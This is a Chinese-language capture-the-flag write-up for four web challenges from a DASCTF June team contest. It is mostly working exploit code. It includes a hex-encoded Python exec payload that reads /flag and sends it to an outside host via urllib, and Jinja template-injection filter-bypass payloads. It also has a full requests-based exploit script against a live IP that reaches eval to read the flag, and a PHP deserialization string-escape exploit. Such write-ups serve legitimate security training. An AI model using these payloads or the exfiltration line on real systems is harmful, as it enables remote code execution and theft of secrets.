#  [DASCTF六月团队赛](https://xpro-adl.91ctf.com/match/CTF1467/)

##  简单的计算题1




```python

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, render_template, request,session
from config import black_list,create
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

## flag is in /flag try to get it

@app.route('/', methods=['GET', 'POST'])
def index():

    def filter(string):
        for black_word in black_list:
            if black_word in string:
                return "hack"
        return string

    if request.method == 'POST':
        input = request.form['input']
        create_question = create()
        input_question = session.get('question')
        session['question'] = create_question
        if input_question==None:
            return render_template('index.html', answer="Invalid session please try again!", question=create_question)
        if filter(input)=="hack":
            return render_template('index.html', answer="hack", question=create_question)
        try:
            calc_result = str((eval(input_question + "=" + str(input))))
            if calc_result == 'True':
                result = "Congratulations"
            elif calc_result == 'False':
                result = "Error"
            else:
                result = "Invalid"
        except:
            result = "Invalid"
        return render_template('index.html', answer=result,question=create_question)

    if request.method == 'GET':
        create_question = create()
        session['question'] = create_question
        return render_template('index.html',question=create_question)

@app.route('/source')
def source():
        return open("app.py", "r").read()

if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=False)

```



```
black_list=['os','system','import','eval']
```



利用exec来绕过黑名单

```
s="""import urllib;urllib.request.urlopen("http://aliyun1.ccreater.top:60080/?"+open("/flag").read())"""
for i in s:
    print("\\x"+hex(ord(i))[2:],end="")
```



## 简单的计算机2

```python

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, render_template, request,session
from config import black_list,create
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

## flag is in /flag try to get it

@app.route('/', methods=['GET', 'POST'])
def index():

    def filter(string):
        for black_word in black_list:
            if black_word in string:
                return "hack"
        return string

    if request.method == 'POST':
        input = request.form['input']
        create_question = create()
        input_question = session.get('question')
        session['question'] = create_question
        if input_question == None:
            return render_template('index.html', answer="Invalid session please try again!", question=create_question)
        if filter(input)=="hack":
            return render_template('index.html', answer="hack", question=create_question)
        calc_str = input_question + "=" + str(input)
        try:
            calc_result = str((eval(calc_str)))
        except Exception as ex:
            calc_result = "Invalid"
        return render_template('index.html', answer=calc_result,question=create_question)

    if request.method == 'GET':
        create_question = create()
        session['question'] = create_question
        return render_template('index.html',question=create_question)

@app.route('/source')
def source():
        return open("app.py", "r").read()

if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=False)

```

和一一样的payload就可以打通

##  easyflask



```python
from Crypto.Util.number import getPrime,inverse,getStrongPrime,GCD,bytes_to_long,long_to_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import gmpy2
N=15082249479222903197495240948325828903858050068198499244835708591924961487708402735056722341992344535142558909774429302606419986246718891528375365094286873074476645859435047605443021008306885721880431756923655321990455955515865684292298138709432641408063384848534514020938745467843623157166026213647940015018236631150485037282533323716613858762632493429046296793140733840032425700646673538381564381054909173221638785506578912052872402384286527659200184724496769032819640318599665649291949429129355053924136820435169176488433627139966261541078344029370699461076322265452213134475345753211159540760342835135870990248201
e=160609172437594276942766303901499802641951491389383975605586149605046198981862969033187382877162415885847979113097179745983555146799595413583740147312730306777506379822460072868639431943047388895396736254918236288565534264665265322206205757360200970373117008748114934891982074644102164757801448115147608272747
d=13923473474716720523934006326565745818221290178904986382540336380989739980509669806245268808770937367303037263865848440067863296855356481275456671685856228563679845251632201358652527158363317559397851235146289583622862852442424969632215840083121655165273918299238768372991722948932694084976220610032378881442123029438878304115450290932132322363716260361756463688449239721366917104041790180175400524065729910010811081819945722099333497521131026498587952369393249490858774944387815050652925677026458999114874486800006307381696332143026349848853313016667992957243098930509349195824310541084322054777132506185435273501839
p=107934625741644256334530351443272085799995340736772901128579413489868256368842679268124692320856817617598139811543445194489399221513808448846718315631164214691414383593586034659989158255539404744825162575963724711041608349048068060257761409515201949273760971477662413329827937256487502767772066264460375538879
q=139735042166396666186812104905743523953420037965832394896506248665567638935308126684704350405144725760943566905541319354949305708189815011841980570425518290312817098102879805901345577921502553115064673007784087692112403161830769145488619379246899811081061648824252046064231758748140334620662599547092704830519
c=2042664418674436701893055435311223023806061846400045383105395102669386103600795504338720227059980854032263779960693172380606883776588246478181206980816816678807853097536202898500459882966354258287388484080346541737839317636426399310241220718144918482070124210272765422378907622465759496344085090302262526343481002958143154291811840667023610130778105742776612561737893315247220292352829134113091183604403933322727268767655360321385337516969398100424688399892245131104257212404304309985452876446152138702226367670984226377569371902785894128941859357316094301505547750405184971038794807736764501666021355969723143622474
print(long_to_bytes(gmpy2.powmod(c, d, N)))
```

token:`d33b0c00a9e921cf2c7667978841daa9`





```
eyJ0b2tlbiI6ImQzM2IwYzAwYTllOTIxY2YyYzc2Njc5Nzg4NDFkYWE5In0.XvSKHA.gwVaS2u26JPtZYIj8KNYU8O1fnE
```

```
admin","admin":false,"a":"1
```

ssti读secret_key

黑名单：`_,+,config,[],|join,|format`

用replace过滤器+request.args来绕过限制

```
{{request.args.s|replace(request.args.o,request.args.n)}}
s.post("http://183.129.189.60:10022/login/",data={"username": """{{request|attr(request.args.param)|attr(request.args.SELF|replace(request.args.o,request.args.n)|lower)|attr(request.args.getdata)|attr(request.args.globals|replace(request.args.o,request.args.n))}}""", "Login": "Login"})
session=s.cookies.get("session").split(".")[0]#request|attr(request.args.param)
dec(session)
print(s.cookies.get("session"))
result=s.get("http://183.129.189.60:10022/user/",params={"json":"json","getdata":"_get_data_for_json","param":"application","SELF":"--SELF--","o":"-","n":"_","globals":"--globals--"}).text


```

最后的payload:

```python
    s.post("http://183.129.189.60:10022/login/",data={"username": """{% for key,value in (request|attr(request.args.param)|attr(request.args.SELF|replace(request.args.o,request.args.n)|lower)|attr(request.args.getdata)|attr(request.args.globals|replace(request.args.o,request.args.n))).items()  %}{% if key == request.args.builtins|replace(request.args.o,request.args.n) %}{% for k,v in value.items()%}{% if k==request.args.EVAL|lower %} {{v(request.args.FUCK)}} {% endif %}{% endfor %}{% endif %}{% endfor %}""", "Login": "Login"})
    result=s.get("http://183.129.189.60:10022/user/",params={"FUCK":"open('app.py').read()","EVAL":"EVAL","builtins":"--builtins--","getdata":"_get_data_for_json","param":"application","SELF":"--SELF--","o":"-","n":"_","globals":"--globals--"}).text

```

app.py

```python
import os
import hashlib

app = Flask(__name__)
# fake
app.config['SECRET_KEY'] = "flag{265eac50c18fa6f255a1fc253dc7ff7b}"
flag = b'flag{265eac50c18fa6f255a1fc253dc7ff7b}'
token = hashlib.md5(flag).hexdigest()
@app.route('/',methods=['GET','POST'])
def index():
    global token
    message = {"info":"Give me your public key and I will give you token", "token":"null"}
    if request.method == 'POST':
        N = request.form.get('N') or None
        e = request.form.get('e') or None
        try:
            if N is not None and e is not None:
                message["info"] = pow(int.from_bytes(token.encode(), 'big'), int(e), int(N))
        except:
            message["info"] = "N or e wrong"

        user_token = request.form.get('token') or None
        if user_token == token :
            session['token'] = token

            return redirect(url_for('login'))
        else:
            message["token"] = "wrong"
    return render_template('index.html', message = message)

@app.route('/login/',methods=['GET','POST'])
def login():
    global token
    if session.get('token',None)==token:
        if request.method == 'POST':
            username = request.form.get('username')
            session['username'] = username
            session['admin'] = False

            return redirect(url_for('user'))

        return render_template('login.html')

    return redirect(url_for('index'))

def check(payload, url):
    black_list = ['sys', 'dict', 'self', 'range', '|format', ']', 'namespace', 'popen', '[', 'timeit', 'os', '__class__', "'", 'pty', 'joiner', '"', 'g|', 'subprocess', '|join', 'config', 'commands', 'importlib', 'class', '_', 'url_for', 'system', 'import', 'eval', 'exec', 'lipsum', 'platform', 'request[request.', 'get_flashed_messages', 'cycler', '%2b', 'session', '()|', '+']
    sys_list = ['sys', 'dict', 'self', 'range', '|format', ']', 'namespace', 'popen', '[', 'timeit', 'os', "'", 'pty', 'joiner', '"', 'g|', 'subprocess', '|join', 'config', 'commands', 'importlib', 'url_for', 'system', 'import', 'eval', 'exec', 'lipsum', 'platform', 'request[request.', 'get_flashed_messages', 'cycler', '%2b', 'session', '()|', '+']
    for i in sys_list:
        if url.find(i) != -1:
            return False
    for i in black_list:
        if payload.find(i) != -1:
            return False

    return True

@app.route('/user/',methods=['GET'])
def user():
    try:
        if (session['username'] != "") and (request.method == 'GET') and session.get('token',None):
            name = request.args.get('username') or session.get('username',None)

            template = '''
                           <p>The girls in DASCTF are beautiful !</p></br>
                           <p>Congratulations on %s's girlfriend!</p>
                           <p>But admin is {{ session.admin }}!You can't get /flag</p>
                ''' % name

            if name!="" and check(name,request.url):
                return render_template_string(template, name=name)
            else:
                return "check error"
    except:
        template = '<h2>something wrong!</h2>'
        return render_template_string(template)

@app.route('/flag/',methods=['GET'])
def get_flag():
    if session.get('admin',None):
        return os.getenv('FLAG')
    return "No permission for true flag"

@app.errorhandler(404)
def page_not_found(e):
    template = '''
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
    </div>
'''
    return render_template_string(template), 404
 's girlfriend!</p>
                           <p>But admin is False!You can't get /flag</p>
```







exp.py

```python
import requests
import base64
import binascii
import html
def dec(session):
    while True:
        try:
            
            print(str(base64.b64decode(session),encoding="utf-8"))
        except binascii.Error:
            session+="="
            continue
        except Exception as e:
            print(e)
        break
def main():
    s=requests.session()
    burp0_url = "http://183.129.189.60:10022/"
    burp0_cookies = {}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://183.129.189.60:10022", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://183.129.189.60:10022/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    burp0_data = {"token": "d33b0c00a9e921cf2c7667978841daa9"}
    s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
    session=s.cookies.get("session").split(".")[0]
    dec(session)
    s.post("http://183.129.189.60:10022/login/",data={"username": """{% for key,value in (request|attr(request.args.param)|attr(request.args.SELF|replace(request.args.o,request.args.n)|lower)|attr(request.args.getdata)|attr(request.args.globals|replace(request.args.o,request.args.n))).items()  %}{% if key == request.args.builtins|replace(request.args.o,request.args.n) %}{% for k,v in value.items()%}{% if k==request.args.EVAL|lower %} {{v(request.args.FUCK|replace(request.args.OOS,request.args.OOS|lower)|replace(request.args.OIMPORT,request.args.OIMPORT|lower|replace(request.args.o,request.args.n)))}}{% endif %}{% endfor %}{% endif %}{% endfor %}""", "Login": "Login"})
    session=s.cookies.get("session").split(".")[0]#request|attr(request.args.param)
    dec(session)
    print(s.cookies.get("session"))
    result=s.get("http://183.129.189.60:10022/user/",params={"FUCK":"--IMPORT--('OS').getenv('FLAG')","OIMPORT":"--IMPORT--","OOS":"OS","EVAL":"EVAL","builtins":"--builtins--","getdata":"_get_data_for_json","param":"application","SELF":"--SELF--","o":"-","n":"_","globals":"--globals--"}).text
    print(html.unescape(result))
main()
```





##  phpuns 

```php
<?php
function add($data)
{
    $data = str_replace(chr(0).'*'.chr(0), '\0*\0', $data);
    return $data;
}

function reduce($data)
{
    $data = str_replace('\0*\0', '1*1', $data);
    return $data;
}
class User{
    protected $username;
    protected $password;
    protected $admin;

    public function __construct($username, $password){
        $this->username = $username;
        $this->password = $password;
        $this->admin = 0;
    }
}
class Hacker_C{
    public $name = 'test';

    public function __invoke(){
        echo "flag{success}";
    }
}
class Hacker_B{
    public $c2e38;

    public function __construct(){
        $this->c2e38 = new Hacker_C();
    }

    public function get_c2e38(){
        return $this->c2e38;
    }

    public function __toString(){
        // $tmp = $this->get_c2e38();
        // $tmp();
        // return 'test';
    }

}
class Hacker_A{
    public $c2e38;

    public function __construct(){
        $this->c2e38 = new Hacker_B();
    }
    public function __destruct() {
        // if(stristr($this->c2e38, "admin")===False){
        //     echo("must be admin");
        // }else{
        //     echo("good luck");
        // }
    }
}

$a=new Hacker_A();


$payload=urldecode("s%3A8%3A%22%00%2A%00admin%22%3Bi%3A0%3B");
#echo $payload;
$username=str_repeat('\0*\0',14);
$password='";s:8:"'."\x00*\x00admin".'";i:1;s:5:"admi2";'.serialize($a).'}';
if(strlen($payload)<100){
    $password="".$password;
}
$password=str_replace("s:","S:",str_replace("c2e38",'\63\32\65\33\38',$password));
echo urlencode($username)."<br />";
echo urlencode($password)."<br />";
#echo urlencode(serialize(new User("1","2")));
$tmp=reduce(serialize(new User($username,$password)));
var_dump(unserialize($tmp));
var_dump($tmp);
var_dump(substr($tmp,39,70));
var_dump(substr($tmp,109));

```

